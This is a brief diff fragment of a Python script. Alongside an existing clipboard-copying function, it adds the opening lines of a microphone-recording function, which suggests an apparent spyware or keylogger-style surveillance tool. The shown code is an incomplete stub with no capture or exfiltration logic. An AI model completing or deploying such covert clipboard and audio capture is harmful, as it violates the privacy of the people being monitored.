@@ -87,3 +87,8 @@ def copy_clipboard():
             f.write("Clipboard Could not be copied. \n")
 
 copy_clipboard()
+
+# Get Microphone Recordings
+def microphone():
+    fs = 44100
+    seconds = microphone_time
